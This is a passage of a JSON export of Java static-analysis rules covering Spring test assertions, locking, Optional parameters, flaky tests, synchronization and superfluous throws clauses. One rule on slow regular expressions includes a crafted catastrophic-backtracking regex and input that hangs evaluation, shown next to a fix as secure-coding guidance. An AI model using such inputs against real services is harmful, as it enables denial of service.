            "name": "Spring's ModelAndViewAssert assertions should be used instead of other assertions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The Spring framework comes with dedicated classes to help writing better and simpler unit tests. In particular, when testing applications built on\ntop of Spring MVC, it is recommended to use Spring's <code>ModelAndViewAssert</code> assertions class, instead of manually testing MVC's\nproperties.</p>\n<p>&nbsp;</p>\n<p>This rule raises an issue when&nbsp;Spring's <code>ModelAndViewAssert</code> assertions should be used instead of manual testing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nModelAndView mav = getMyModelAndView();\n\nAssert.assertEquals(\"register\", mav.getViewName());\nAssert.assertTrue((Boolean) mav.getModelMap().get(\"myAttribute\"));\nAssert.assertFalse((Boolean) mav.getModelMap().get(\"myAttribute\"));\nAssert.assertEquals(myObject, mav.getModelMap().get(\"myAttribute\"));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nModelAndView mav = getMyModelAndView();\n\nModelAndViewAssert.assertViewName(mav, \"register\");\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", Boolean.TRUE);\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", Boolean.FALSE);\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", myObject);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/testing.html#unit-testing-spring-mvc\">Unit Testing\n  Spring MVC</a> </li>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/5.2.8.RELEASE/javadoc-api/org/springframework/test/web/ModelAndViewAssert.html\">ModelAndViewAssert Javadoc</a> </li>\n</ul>",
            "mdDesc": "<p>The Spring framework comes with dedicated classes to help writing better and simpler unit tests. In particular, when testing applications built on\ntop of Spring MVC, it is recommended to use Spring's <code>ModelAndViewAssert</code> assertions class, instead of manually testing MVC's\nproperties.</p>\n<p>&nbsp;</p>\n<p>This rule raises an issue when&nbsp;Spring's <code>ModelAndViewAssert</code> assertions should be used instead of manual testing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nModelAndView mav = getMyModelAndView();\n\nAssert.assertEquals(\"register\", mav.getViewName());\nAssert.assertTrue((Boolean) mav.getModelMap().get(\"myAttribute\"));\nAssert.assertFalse((Boolean) mav.getModelMap().get(\"myAttribute\"));\nAssert.assertEquals(myObject, mav.getModelMap().get(\"myAttribute\"));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nModelAndView mav = getMyModelAndView();\n\nModelAndViewAssert.assertViewName(mav, \"register\");\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", Boolean.TRUE);\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", Boolean.FALSE);\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", myObject);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/testing.html#unit-testing-spring-mvc\">Unit Testing\n  Spring MVC</a> </li>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/5.2.8.RELEASE/javadoc-api/org/springframework/test/web/ModelAndViewAssert.html\">ModelAndViewAssert Javadoc</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2222",
            "repo": "java",
            "name": "Locks should be released",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a lock is acquired and released within a method, then it must be released along all execution paths of that method.</p>\n<p>Failing to do so will expose the conditional locking logic to the method's callers and hence be deadlock-prone.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  public void doSomething() {\n    Lock lock = new Lock();\n    lock.lock(); // Noncompliant\n    if (isInitialized()) {\n      // ...\n      lock.unlock();\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  public void doSomething() {\n    Lock lock = new Lock();\n    if (isInitialized()) {\n      lock.lock();\n      // ...\n      lock.unlock();\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/459.html\">MITRE, CWE-459</a> - Incomplete Cleanup </li>\n</ul>",
            "mdDesc": "<p>If a lock is acquired and released within a method, then it must be released along all execution paths of that method.</p>\n<p>Failing to do so will expose the conditional locking logic to the method's callers and hence be deadlock-prone.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  public void doSomething() {\n    Lock lock = new Lock();\n    lock.lock(); // Noncompliant\n    if (isInitialized()) {\n      // ...\n      lock.unlock();\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  public void doSomething() {\n    Lock lock = new Lock();\n    if (isInitialized()) {\n      lock.lock();\n      // ...\n      lock.unlock();\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/459.html\">MITRE, CWE-459</a> - Incomplete Cleanup </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3553",
            "repo": "java",
            "name": "\"Optional\" should not be used for parameters",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The Java language authors have been quite frank that <code>Optional</code> was intended for use only as a return type, as a way to convey that a\nmethod may or may not return a value. </p>\n<p>And for that, it's valuable but using <code>Optional</code> on the input side increases the work you have to do in the method without really\nincreasing the value. With an <code>Optional</code> parameter, you go from having 2 possible inputs: null and not-null, to three: null,\nnon-null-without-value, and non-null-with-value. Add to that the fact that overloading has long been available to convey that some parameters are\noptional, and there's really no reason to have <code>Optional</code> parameters.</p>\n<p>The rule also checks for Guava's <code>Optional</code>, as it was the inspiration for the JDK <code>Optional</code>. Although it is different in\nsome aspects (serialization, being recommended for use as collection elements), using it as a parameter type causes exactly the same problems as for\nJDK <code>Optional</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String sayHello(Optional&lt;String&gt; name) {  // Noncompliant\n  if (name == null || !name.isPresent()) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String sayHello(String name) {\n  if (name == null) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>",
            "mdDesc": "<p>The Java language authors have been quite frank that <code>Optional</code> was intended for use only as a return type, as a way to convey that a\nmethod may or may not return a value. </p>\n<p>And for that, it's valuable but using <code>Optional</code> on the input side increases the work you have to do in the method without really\nincreasing the value. With an <code>Optional</code> parameter, you go from having 2 possible inputs: null and not-null, to three: null,\nnon-null-without-value, and non-null-with-value. Add to that the fact that overloading has long been available to convey that some parameters are\noptional, and there's really no reason to have <code>Optional</code> parameters.</p>\n<p>The rule also checks for Guava's <code>Optional</code>, as it was the inspiration for the JDK <code>Optional</code>. Although it is different in\nsome aspects (serialization, being recommended for use as collection elements), using it as a parameter type causes exactly the same problems as for\nJDK <code>Optional</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String sayHello(Optional&lt;String&gt; name) {  // Noncompliant\n  if (name == null || !name.isPresent()) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String sayHello(String name) {\n  if (name == null) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5973",
            "repo": "java",
            "name": "Tests should be stable",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Unstable / flaky tests are tests which sometimes pass and sometimes fail, without any code change. Obviously, they slow down developments when\nengineers have to rerun failed tests. However the real problem is that you can't completely trust these tests, they might fail for many different\nreasons and you don't know if any of them will happen in production.</p>\n<p>Some tools, such as TestNG, enable developers to automatically retry flaky tests. This might be ok as a temporary solution, but it should\ndefinitely be fixed. The more flaky tests you add, the more chances there are for a bug to arrive in production.</p>\n<p>This rule raises an issue when the annotation <code>org.testng.annotations.Test</code> is given a <code>successPercentage</code> argument with a\nvalue lower than <code>100</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.testng.annotations.Test;\n\npublic class PercentageTest {\n    @Test(successPercentage = 80, invocationCount = 10)  // Noncompliant. The test is allowed to fail 2 times.\n    public void flakyTest() {\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://testng.org/doc/documentation-main.html#annotations\">TestNG documentation - Annotations</a> </li>\n  <li> <a href=\"https://engineering.atspotify.com/2019/11/18/test-flakiness-methods-for-identifying-and-dealing-with-flaky-tests/\">Test Flakiness -\n  Methods for identifying and dealing with flaky tests</a> </li>\n</ul>",
            "mdDesc": "<p>Unstable / flaky tests are tests which sometimes pass and sometimes fail, without any code change. Obviously, they slow down developments when\nengineers have to rerun failed tests. However the real problem is that you can't completely trust these tests, they might fail for many different\nreasons and you don't know if any of them will happen in production.</p>\n<p>Some tools, such as TestNG, enable developers to automatically retry flaky tests. This might be ok as a temporary solution, but it should\ndefinitely be fixed. The more flaky tests you add, the more chances there are for a bug to arrive in production.</p>\n<p>This rule raises an issue when the annotation <code>org.testng.annotations.Test</code> is given a <code>successPercentage</code> argument with a\nvalue lower than <code>100</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.testng.annotations.Test;\n\npublic class PercentageTest {\n    @Test(successPercentage = 80, invocationCount = 10)  // Noncompliant. The test is allowed to fail 2 times.\n    public void flakyTest() {\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://testng.org/doc/documentation-main.html#annotations\">TestNG documentation - Annotations</a> </li>\n  <li> <a href=\"https://engineering.atspotify.com/2019/11/18/test-flakiness-methods-for-identifying-and-dealing-with-flaky-tests/\">Test Flakiness -\n  Methods for identifying and dealing with flaky tests</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design",
                "tests",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3551",
            "repo": "java",
            "name": "Overrides should match their parent class methods in synchronization",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper\nsynchronization as callers rely on the thread-safety promised by the parent class.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n\n  synchronized void foo() {\n    //...\n  }\n}\n\npublic class Child extends Parent {\n\n @Override\n  public foo () {  // Noncompliant\n    // ...\n    super.foo();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Parent {\n\n  synchronized void foo() {\n    //...\n  }\n}\n\npublic class Child extends Parent {\n\n  @Override\n  synchronized foo () {\n    // ...\n    super.foo();\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/gzdGBQ\">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are not\n  thread-safe </li>\n</ul>",
            "mdDesc": "<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper\nsynchronization as callers rely on the thread-safety promised by the parent class.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n\n  synchronized void foo() {\n    //...\n  }\n}\n\npublic class Child extends Parent {\n\n @Override\n  public foo () {  // Noncompliant\n    // ...\n    super.foo();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Parent {\n\n  synchronized void foo() {\n    //...\n  }\n}\n\npublic class Child extends Parent {\n\n  @Override\n  synchronized foo () {\n    // ...\n    super.foo();\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/gzdGBQ\">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are not\n  thread-safe </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5852",
            "repo": "java",
            "name": "Using slow regular expressions is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating\nan input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity\nof the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger\n<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too\nwith, in this case, a large carefully-crafted input (thousands chars).</p>\n<p>This rule detects regular expression patterns known to have potential performance issues:</p>\n<ul>\n  <li> <code>Nested quantifiers</code> which are quantifiers inside a group that is itself repeated by a quantifier (eg: <code>/(a+)+/</code>). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid <code>catastrophic backtracking</code> situations, when possible:</p>\n<ul>\n  <li> The maximum number of expected repetitions should be defined with the corresponding quantifier, like <code>{1,5}</code> instead of\n  <code>+</code> for instance. </li>\n  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this\n  nested quantifier situation <code>(ba+)+</code> doesn't cause performance issues, indeed, the inner group can be matched only if it exists exactly\n  one <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>The first regex evaluation will never end in <code>OpenJDK</code> &lt;= 9 and the second regex evaluation will never end in any versions of\n<code>OpenJDK</code>:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)+\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Sensitive\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)++\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Compliant\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/400.html\">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a href=\"https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net</a> - Outage Postmortem - July 20, 2016\n  </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/fr-fr/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>",
            "mdDesc": "<p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating\nan input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity\nof the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger\n<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too\nwith, in this case, a large carefully-crafted input (thousands chars).</p>\n<p>This rule detects regular expression patterns known to have potential performance issues:</p>\n<ul>\n  <li> <code>Nested quantifiers</code> which are quantifiers inside a group that is itself repeated by a quantifier (eg: <code>/(a+)+/</code>). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid <code>catastrophic backtracking</code> situations, when possible:</p>\n<ul>\n  <li> The maximum number of expected repetitions should be defined with the corresponding quantifier, like <code>{1,5}</code> instead of\n  <code>+</code> for instance. </li>\n  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this\n  nested quantifier situation <code>(ba+)+</code> doesn't cause performance issues, indeed, the inner group can be matched only if it exists exactly\n  one <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>The first regex evaluation will never end in <code>OpenJDK</code> &lt;= 9 and the second regex evaluation will never end in any versions of\n<code>OpenJDK</code>:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)+\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Sensitive\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)++\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Compliant\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/400.html\">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a href=\"https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net</a> - Outage Postmortem - July 20, 2016\n  </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/fr-fr/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a1",
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1130",
            "repo": "java",
            "name": "\"throws\" declarations should not be superfluous",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>\n<p> * listed multiple times</p>\n<p> * a subclass of another listed exception</p>\n<p> * completely unnecessary because the declared exception type cannot actually be thrown</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo() throws MyException, MyException {}  // Noncompliant; should be listed once\nvoid bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo() throws MyException {}\nvoid bar() throws Throwable {}\n</pre>\n<h2>Exceptions</h2>\n<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>\n<p> * in overriding and implementation methods</p>\n<p> * in interface <code>default</code> methods</p>\n<p> * in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement.</p>\n<p> * in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper\nJavaDoc</p>\n<p>Also, the rule won't raise issues on <code>RuntimeException</code>, or one of its descendants, because explicating runtime exceptions which could\nbe thrown can ultimately help the method's users, and can even be considered as good practice.</p>\n<pre>\nclass A extends B {\n  @Override\n  void doSomething() throws IOException {\n    compute(a);\n  }\n\n  public void foo() throws IOException {}\n\n  public void qix() throws MyRuntimeException {}\n\n  protected void bar() throws IOException {\n    throw new UnsupportedOperationException(\"This method should be implemented in subclasses\");\n  }\n\n  Object foobar(String s) throws IOException {\n    return null;\n  }\n\n  /**\n   * @throws IOException Overriding classes may throw this exception if they print values into a file\n   */\n  protected void print() throws IOException { // no issue, method is overridable and the exception has proper javadoc\n    System.out.println(\"foo\");\n  }\n}\n</pre>",
            "mdDesc": "<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>\n<p> * listed multiple times</p>\n<p> * a subclass of another listed exception</p>\n<p> * completely unnecessary because the declared exception type cannot actually be thrown</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo() throws MyException, MyException {}  // Noncompliant; should be listed once\nvoid bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo() throws MyException {}\nvoid bar() throws Throwable {}\n</pre>\n<h2>Exceptions</h2>\n<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>\n<p> * in overriding and implementation methods</p>\n<p> * in interface <code>default</code> methods</p>\n<p> * in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement.</p>\n<p> * in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper\nJavaDoc</p>\n<p>Also, the rule won't raise issues on <code>RuntimeException</code>, or one of its descendants, because explicating runtime exceptions which could\nbe thrown can ultimately help the method's users, and can even be considered as good practice.</p>\n<pre>\nclass A extends B {\n  @Override\n  void doSomething() throws IOException {\n    compute(a);\n  }\n\n  public void foo() throws IOException {}\n\n  public void qix() throws MyRuntimeException {}\n\n  protected void bar() throws IOException {\n    throw new UnsupportedOperationException(\"This method should be implemented in subclasses\");\n  }\n\n  Object foobar(String s) throws IOException {\n    return null;\n  